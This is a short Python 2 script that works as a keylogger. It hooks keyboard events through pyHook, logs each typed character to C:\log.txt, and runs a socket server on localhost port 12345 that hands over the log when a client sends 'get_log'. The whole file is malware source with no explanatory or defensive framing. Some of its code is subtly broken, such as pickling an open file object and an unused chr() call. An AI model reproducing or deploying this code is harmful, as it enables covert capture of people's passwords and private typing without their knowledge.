import pyHook, pythoncom, sys, logging, socket, thread, pickle

key_log = 'C:\\log.txt'

def KeyEvent(event):
    logging.basicConfig(filename=key_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10, chr(event.Ascii))
    return True

def sendLog():
    while True:
        s = socket.socket()
        s.bind(('127.0.0.1', 12345))
        s.listen(1)
        conn, addr = s.accept()
        if (conn.recv(1024) == "get_log"):
            logFile = open(key_log, 'r')
            conn.send(pickle.dumps(logFile, -1))
            print "sent log to ", addr
        conn.close()
        s.close()
        

thread.start_new_thread(sendLog, ())

hook = pyHook.HookManager()
hook.KeyDown = KeyEvent
hook.HookKeyboard()
pythoncom.PumpMessages()

